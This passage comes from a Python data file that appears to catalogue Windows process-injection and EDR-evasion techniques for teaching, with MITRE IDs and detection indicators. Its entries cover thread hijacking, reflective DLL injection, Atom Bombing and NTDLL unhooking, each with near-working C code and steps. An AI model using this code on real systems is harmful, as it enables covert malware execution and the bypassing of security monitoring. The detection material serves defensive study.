        "mitre_attack": "T1055.003",
        "tags": ["thread", "SetThreadContext", "GetThreadContext", "hijack"],
        "short_desc": "Suspends a running thread, overwrites its RIP/EIP with shellcode, then resumes it.",
        "description": (
            "Thread hijacking redirects an existing thread in the target process without creating new "
            "threads. The attacker suspends a thread, reads its current CPU context (registers), saves "
            "the original instruction pointer, overwrites RIP/EIP to point at shellcode, then resumes.\n\n"
            "When the thread resumes, it executes the attacker's code. The shellcode must eventually "
            "restore the original context and jump back to the legitimate continuation address to avoid "
            "crashing the process — a technique called context restoration or return-oriented stubs.\n\n"
            "This is more complex than DLL injection but avoids creating new threads, making it harder "
            "to detect via thread enumeration. A common pitfall: hijacking a thread that is waiting in "
            "a kernel call (SuspendThread returns but the thread is still in the kernel) can cause "
            "instability if the shellcode doesn't properly handle the stack frame."
        ),
        "how_it_works": [
            "OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) and enumerate threads with CreateToolhelp32Snapshot.",
            "Select a suitable thread (one NOT in a critical section or blocking syscall).",
            "OpenThread(THREAD_ALL_ACCESS, FALSE, tid) and SuspendThread(hThread).",
            "GetThreadContext(hThread, &ctx) to capture the full register state.",
            "Save ctx.Rip (the original return address to restore later).",
            "VirtualAllocEx + WriteProcessMemory to plant shellcode + a small restore stub.",
            "Patch ctx.Rip to point at the shellcode start address.",
            "SetThreadContext(hThread, &ctx) to commit the modified context.",
            "ResumeThread — the hijacked thread now runs shellcode.",
            "Shellcode eventually restores original registers and jumps back to the saved Rip.",
        ],
        "code_example": r"""#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Find first thread of a process (skip thread 0 — often critical)
DWORD GetFirstThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { .dwSize = sizeof(te) };
    DWORD tid = 0;

    for (BOOL ok = Thread32First(snap, &te); ok; ok = Thread32Next(snap, &te)) {
        if (te.th32OwnerProcessID == pid) { tid = te.th32ThreadID; break; }
    }
    CloseHandle(snap);
    return tid;
}

BOOL HijackThread(DWORD pid, PBYTE sc, SIZE_T scLen) {
    DWORD tid = GetFirstThread(pid);
    if (!tid) return FALSE;

    HANDLE hProc   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);

    // 1. Allocate + write shellcode in target
    LPVOID remote = VirtualAllocEx(hProc, NULL, scLen,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remote, sc, scLen, NULL);

    // 2. Suspend and read context
    SuspendThread(hThread);
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(hThread, &ctx);

    printf("[*] Original RIP = 0x%llX\n", ctx.Rip);

    // 3. Redirect execution to shellcode
    ctx.Rip = (ULONGLONG)remote;
    SetThreadContext(hThread, &ctx);

    printf("[+] RIP patched → %p. Resuming thread %lu.\n", remote, tid);
    ResumeThread(hThread);

    // NOTE: real shellcode must restore ctx and jmp back to original RIP
    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}
""",
        "code_language": "c",
        "detection": [
            "SuspendThread + SetThreadContext from an external process is a strong hijacking indicator.",
            "Thread's Rip/Eip pointing into anonymous (non-image-backed) memory after a resume.",
            "GetThreadContext / SetThreadContext cross-process calls logged via ETW or EDR API hooks.",
            "Unexpected context switches: a thread that was idle suddenly executing in a foreign region.",
            "Behavioral: process crashes or instability caused by partial hijack attempts.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Animated walkthrough showing the thread context before and after modification, "
            "highlighting the RIP register change and the execution flow redirection."
        ),
    },

    # ─────────────────────────────────────────────────────────────────────────
    # ADVANCED EVASION
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "reflective_dll",
        "name": "Reflective DLL Injection",
        "category": "Advanced Evasion",
        "difficulty": "Expert",
        "platform": "Windows",
        "mitre_attack": "T1055.001",
        "tags": ["reflective", "DLL", "in-memory", "PIC", "loader"],
        "short_desc": "Loads a DLL entirely from memory, bypassing the Windows loader and leaving no on-disk artefact.",
        "description": (
            "Reflective DLL Injection, introduced by Stephen Fewer in 2008, enables a DLL to load "
            "itself into memory without calling the Windows loader (LoadLibrary). The DLL contains a "
            "custom bootstrapping function (ReflectiveLoader) that acts as a miniature loader: it "
            "parses its own PE header, maps sections, resolves imports, applies relocations, and calls "
            "DllMain — all from within the injected payload.\n\n"
            "Because the Windows loader is never involved, the DLL never appears in the PEB module "
            "list, there is no file on disk to scan, and the module is invisible to EnumProcessModules. "
            "This makes it the gold standard for in-memory implants and is the foundation of Cobalt "
            "Strike's Beacon, meterpreter, and countless other post-exploitation frameworks.\n\n"
            "The injector only needs to: copy the DLL bytes into the remote process and call "
            "CreateRemoteThread at the ReflectiveLoader export — which is at a known offset."
        ),
        "how_it_works": [
            "The payload DLL exports a ReflectiveLoader function as the first step of self-bootstrap.",
            "Injector copies the raw DLL bytes into the target process (VirtualAllocEx + WriteProcessMemory).",
            "CreateRemoteThread starts at the offset of ReflectiveLoader within the blob.",
            "ReflectiveLoader walks the PEB.Ldr to find kernel32.dll and ntdll.dll without using the import table.",
            "Uses hash-based API resolution to locate VirtualAlloc, LoadLibraryA, GetProcAddress.",
            "Allocates a new memory region sized for the DLL's full virtual image.",
            "Copies PE headers and all sections to the new region.",
            "Processes the import directory: loads required DLLs and resolves function addresses.",
            "Applies base relocations if the allocated base differs from the preferred base.",
            "Calls DllMain(DLL_PROCESS_ATTACH) to run the actual payload.",
        ],
        "code_example": r"""// ReflectiveLoader bootstrap — runs entirely in the remote process
// (Simplified; full impl at: github.com/stephenfewer/ReflectiveDLLInjection)
#include <windows.h>
#include "ReflectiveLoader.h"

// This function must be the first export (or at a fixed offset)
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {

    // ── Step 1: find our own base by scanning backwards for the MZ header ──
    ULONG_PTR uiLibraryAddress = (ULONG_PTR)ReflectiveLoader;
    while (*(WORD *)uiLibraryAddress != IMAGE_DOS_SIGNATURE) uiLibraryAddress--;

    // ── Step 2: walk PEB.Ldr to find kernel32.dll (hash-based, no IAT) ─────
    ULONG_PTR kernel32Base = GetK32Base();   // internal PEB walk
    PFN_LoadLibraryA     pLoadLibA = (PFN_LoadLibraryA)
                            HashGetProcAddress(kernel32Base, HASH_LOADLIBRARYA);
    PFN_GetProcAddress   pGetProc  = (PFN_GetProcAddress)
                            HashGetProcAddress(kernel32Base, HASH_GETPROCADDRESS);
    PFN_VirtualAlloc     pVirtAlloc = (PFN_VirtualAlloc)
                            HashGetProcAddress(kernel32Base, HASH_VIRTUALALLOC);

    // ── Step 3: parse our PE and allocate a new virtual image ──────────────
    PIMAGE_NT_HEADERS nt   = NtHdrs(uiLibraryAddress);
    ULONG_PTR newBase      = (ULONG_PTR)pVirtAlloc(
                                (LPVOID)nt->OptionalHeader.ImageBase,
                                nt->OptionalHeader.SizeOfImage,
                                MEM_RESERVE | MEM_COMMIT,
                                PAGE_EXECUTE_READWRITE);

    // ── Step 4: copy headers + sections ─────────────────────────────────────
    memcpy((void *)newBase, (void *)uiLibraryAddress, nt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER sec = FirstSection(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
        memcpy((BYTE *)newBase + sec->VirtualAddress,
               (BYTE *)uiLibraryAddress + sec->PointerToRawData,
               sec->SizeOfRawData);

    // ── Step 5: process imports ──────────────────────────────────────────────
    ProcessImports(newBase, nt, pLoadLibA, pGetProc);

    // ── Step 6: apply base relocations ──────────────────────────────────────
    LONGLONG delta = (LONGLONG)newBase - (LONGLONG)nt->OptionalHeader.ImageBase;
    if (delta) ApplyRelocations(newBase, nt, delta);

    // ── Step 7: call DllMain ─────────────────────────────────────────────────
    DLL_MAIN pDllMain = (DLL_MAIN)(newBase + nt->OptionalHeader.AddressOfEntryPoint);
    pDllMain((HINSTANCE)newBase, DLL_PROCESS_ATTACH, NULL);

    return newBase;
}
""",
        "code_language": "c",
        "detection": [
            "Memory region that contains a PE image (MZ/PE header) but is NOT tracked by the loader — pe-sieve detects this.",
            "Executable private memory (anonymous, not file-backed) containing structured PE data.",
            "Thread start address within an anonymous executable region — CreateRemoteThread to raw bytes.",
            "No DLL entry in PEB.Ldr despite PE headers present in process memory.",
            "Cobalt Strike / meterpreter signatures for specific ReflectiveLoader hash constants (0x6A4ABC5B etc.).",
            "Behavioral: process performs complex self-mapping behavior before calling exported functions.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step walkthrough of the ReflectiveLoader bootstrap process: "
            "PEB walk, hash resolution, section mapping, import resolution, and DllMain call."
        ),
    },

    {
        "id": "atom_bombing",
        "name": "Atom Bombing",
        "category": "Advanced Evasion",
        "difficulty": "Expert",
        "platform": "Windows",
        "mitre_attack": "T1055",
        "tags": ["atom", "GlobalAddAtom", "NtQueueApcThread", "evasion"],
        "short_desc": "Stores shellcode in the global atom table, then uses APC to copy and execute it in a target process.",
        "description": (
            "Atom Bombing (discovered by enSilo in 2016) is a code injection technique that exploits the "
            "Windows global atom table — a shared key-value store where any process can add/read entries. "
            "By storing shellcode in atom table entries, the attacker bypasses write-to-foreign-process "
            "APIs (no VirtualAllocEx, no WriteProcessMemory) that many security products monitor.\n\n"
            "The payload is fragmented across multiple atom table entries (each limited to 255 bytes). "
            "An APC is then queued to a thread in the target process to call GlobalGetAtomNameW — which "
            "will copy the atom data INTO the target process's memory. Another APC triggers execution.\n\n"
            "The technique avoids the classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread "
            "tripwire that most AV/EDR products trigger on. However, modern EDRs now also monitor "
            "NtQueueApcThread and atom table abuse patterns."
        ),
        "how_it_works": [
            "Fragment shellcode into 255-byte chunks (the atom table entry size limit).",
            "Call GlobalAddAtomW() for each chunk to store shellcode in the global atom table.",
            "Find an alertable thread in the target process (e.g., in a thread pool or via ntdll wait).",
            "Queue an APC to the target thread via NtQueueApcThread targeting GlobalGetAtomNameW.",
            "GlobalGetAtomNameW copies the atom data from the table into a target-process buffer.",
            "Reassemble the full shellcode in the target's memory using further APC calls.",
            "Queue a final APC to call SetThreadContext or a stub that pivots to the reassembled shellcode.",
            "When the target thread's alertable wait fires, all APCs drain in sequence executing the payload.",
        ],
        "code_example": r"""// Atom Bombing — store shellcode in atom table, copy to target via APC
// Reference: enSilo blog — "AtomBombing: A Brand New Code Injection for Windows"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define ATOM_CHUNK 255

typedef NTSTATUS(NTAPI *PFN_NtQueueApcThread)(HANDLE, PIO_APC_ROUTINE, PVOID, PVOID, PVOID);

// Store shellcode chunks in global atom table
BOOL StorePayloadInAtoms(PBYTE sc, SIZE_T scLen, ATOM *atoms, int *count) {
    *count = 0;
    for (SIZE_T i = 0; i < scLen; i += ATOM_CHUNK) {
        SIZE_T chunk = min((SIZE_T)ATOM_CHUNK, scLen - i);
        wchar_t buf[ATOM_CHUNK + 1];

        // Convert chunk bytes to wide chars (simple encoding)
        for (SIZE_T j = 0; j < chunk; j++) buf[j] = (wchar_t)sc[i + j];
        buf[chunk] = L'\0';

        atoms[*count] = GlobalAddAtomW(buf);
        if (!atoms[*count]) return FALSE;
        (*count)++;
    }
    return TRUE;
}

// Queue APC that calls GlobalGetAtomNameW to copy chunk into target process
BOOL QueueAtomCopyAPC(HANDLE hThread, ATOM atom, LPVOID dest, DWORD bufLen) {
    PFN_NtQueueApcThread NtQueueApc =
        (PFN_NtQueueApcThread)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                              "NtQueueApcThread");

    PVOID pGetAtomName = GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                         "GlobalGetAtomNameW");

    // NtQueueApcThread(thread, routine, atom, dest, bufLen)
    NTSTATUS status = NtQueueApc(hThread,
                                  (PIO_APC_ROUTINE)pGetAtomName,
                                  (PVOID)(ULONG_PTR)atom,
                                  dest,
                                  (PVOID)(ULONG_PTR)bufLen);
    return NT_SUCCESS(status);
}

// Full Atom Bomb injection
BOOL AtomBomb(DWORD pid, PBYTE sc, SIZE_T scLen) {
    ATOM atoms[64];
    int  nAtoms = 0;

    // Step 1: store payload in atom table
    if (!StorePayloadInAtoms(sc, scLen, atoms, &nAtoms)) return FALSE;
    printf("[+] Stored %d atoms in global table\n", nAtoms);

    // Step 2: find alertable thread in target, allocate RWX buffer
    HANDLE hProc   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID remote  = VirtualAllocEx(hProc, NULL, scLen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Step 3: queue APCs to reassemble shellcode in target process
    HANDLE hThread = /* find alertable thread via CreateToolhelp32Snapshot */ NULL;
    BYTE *dest     = (BYTE *)remote;

    for (int i = 0; i < nAtoms; i++) {
        QueueAtomCopyAPC(hThread, atoms[i], dest, ATOM_CHUNK * 2);
        dest += ATOM_CHUNK;
    }

    // Step 4: cleanup atoms from table
    for (int i = 0; i < nAtoms; i++) GlobalDeleteAtom(atoms[i]);

    printf("[+] All APCs queued. Shellcode will assemble on next alertable wait.\n");
    CloseHandle(hProc);
    return TRUE;
}
""",
        "code_language": "c",
        "detection": [
            "Rapid GlobalAddAtomW calls storing binary-looking data (non-printable chars) in atom names.",
            "NtQueueApcThread with GlobalGetAtomNameW as the APC routine is a known Atom Bombing signature.",
            "Cross-process NtQueueApcThread calls not associated with a debugger or legitimate automation.",
            "Anomalous RWX pages appearing in process memory without corresponding VirtualAllocEx from a parent.",
            "Atom table size anomaly: a high count of atoms with random-looking names.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step visualization: watch chunks get stored in the atom table, "
            "then see them being reassembled in a simulated target memory buffer."
        ),
    },

    {
        "id": "ntdll_unhooking",
        "name": "NTDLL Unhooking",
        "category": "Advanced Evasion",
        "difficulty": "Expert",
        "platform": "Windows",
        "mitre_attack": "T1562.001",
        "tags": ["unhook", "ntdll", "EDR bypass", "syscall", "patch"],
        "short_desc": "Restores ntdll.dll's original bytes from disk to remove EDR user-mode hooks before executing payloads.",
        "description": (
            "EDR and AV products insert inline hooks (5-byte JMP patches) at the start of critical "
            "NTDLL syscall stubs (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.) to intercept "
            "and inspect all system calls. NTDLL unhooking removes these hooks by re-reading the "
            "clean ntdll.dll from disk and overwriting the patched bytes with the original code.\n\n"
            "Once unhooked, all subsequent NTDLL calls bypass the EDR's user-mode monitoring layer "
            "entirely. The attacker then has free rein to perform injection, process hollowing, or "
            "other operations without triggering EDR callbacks.\n\n"
            "Variants include: reading the clean copy from disk, mapping a fresh copy from the KnownDLLs "
            "object directory, using direct syscalls (bypassing ntdll entirely), or using hardware "
            "breakpoint-based unhooking that avoids touching ntdll memory at all."
        ),
        "how_it_works": [
            "Read ntdll.dll from disk into a local buffer (CreateFileA + ReadFile on C:\\Windows\\System32\\ntdll.dll).",
            "Alternatively, map from \\KnownDlls\\ntdll.dll via NtOpenSection + NtMapViewOfSection.",
            "Parse the on-disk PE to locate the .text section (where syscall stubs live).",
            "Get the base address of the in-memory ntdll.dll via GetModuleHandle(\"ntdll.dll\").",
            "Use VirtualProtect to make the in-memory .text section writable.",
            "memcpy the clean .text bytes from the disk copy over the hooked in-memory copy.",
            "Restore VirtualProtect to PAGE_EXECUTE_READ.",
            "All subsequent NTDLL calls now use the unpatched stubs — EDR hooks are gone.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

BOOL UnhookNTDLL(void) {
    const char *path = "C:\\Windows\\System32\\ntdll.dll";

    // 1. Open and read clean ntdll from disk
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fileSize = GetFileSize(hFile, NULL);
    PBYTE diskCopy = (PBYTE)VirtualAlloc(NULL, fileSize,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, diskCopy, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    printf("[+] Read %lu bytes from disk ntdll\n", bytesRead);

    // 2. Parse disk copy to find .text section
    PIMAGE_DOS_HEADER dos  = (PIMAGE_DOS_HEADER)diskCopy;
    PIMAGE_NT_HEADERS nt   = (PIMAGE_NT_HEADERS)(diskCopy + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    DWORD textVA   = 0;
    DWORD textRaw  = 0;
    DWORD textSize = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            textVA   = sec->VirtualAddress;
            textRaw  = sec->PointerToRawData;
            textSize = sec->SizeOfRawData;
            break;
        }
    }
    printf("[+] .text: VA=0x%08X  RawOff=0x%08X  Size=0x%08X\n",
           textVA, textRaw, textSize);

    // 3. Get in-memory ntdll base
    HMODULE hNtdll    = GetModuleHandleA("ntdll.dll");
    PBYTE   memText   = (PBYTE)hNtdll + textVA;
    PBYTE   diskText  = diskCopy + textRaw;

    // 4. Make .text writable and overwrite with clean bytes
    DWORD oldProt;
    if (!VirtualProtect(memText, textSize, PAGE_EXECUTE_READWRITE, &oldProt)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(diskCopy, 0, MEM_RELEASE);
        return FALSE;
    }

    memcpy(memText, diskText, textSize);
    VirtualProtect(memText, textSize, oldProt, &oldProt);

    printf("[*] ntdll .text section restored — EDR hooks removed.\n");

    VirtualFree(diskCopy, 0, MEM_RELEASE);
    return TRUE;
}

int main(void) {
    return UnhookNTDLL() ? 0 : 1;
}
""",
        "code_language": "c",
        "detection": [
            "VirtualProtect on ntdll.dll .text section to PAGE_EXECUTE_READWRITE is a near-certain indicator.",
            "Large WriteProcessMemory (or memcpy) into ntdll.dll's address range from the same process.",
            "Kernel-level integrity checks (PatchGuard on drivers, not user-mode) can detect .text modifications.",
            "Some EDRs protect their hooks with guard pages or CRC checks and alert on modification attempts.",
            "Monitor CreateFile opens of ntdll.dll from non-loader processes — reading ntdll from disk is unusual.",
            "ETW stack traces: calls to ReadFile that land in ntdll address space logic paths.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Shows a mock hooked function with the JMP patch bytes, then demonstrates "
            "the restoration process by replacing them with the original syscall stub bytes."
        ),
    },
]

# Build lookup maps
TECHNIQUE_BY_ID = {t["id"]: t for t in TECHNIQUES}
TECHNIQUES_BY_CATEGORY = {}
for t in TECHNIQUES:
    TECHNIQUES_BY_CATEGORY.setdefault(t["category"], []).append(t)

DIFFICULTY_ORDER = {"Beginner": 0, "Intermediate": 1, "Advanced": 2, "Expert": 3}
DIFFICULTY_COLORS = {
    "Beginner":     "#00c896",
    "Intermediate": "#f0a500",
    "Advanced":     "#e05c5c",
    "Expert":       "#c040fb",
}
